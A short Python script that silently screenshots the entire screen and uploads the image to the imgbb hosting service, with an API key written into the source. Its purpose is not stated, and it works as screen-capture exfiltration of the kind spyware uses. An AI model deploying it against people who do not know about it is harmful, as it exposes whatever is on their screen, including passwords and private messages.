import io
import pyautogui
from base64 import b64encode
import requests

KEY_IMG_bb = "84bce84694b11eed9ab8835ef16ebee0"
IMG_BB_URL = "https://api.imgbb.com/1/upload"

screenshot = pyautogui.screenshot()

img_bytes = io.BytesIO()
screenshot.save(img_bytes, format="PNG")
img_bytes = img_bytes.getvalue()
img_encoded = b64encode(img_bytes)
payload = {"key":KEY_IMG_bb, "image":img_encoded}
res = requests.post(IMG_BB_URL, payload)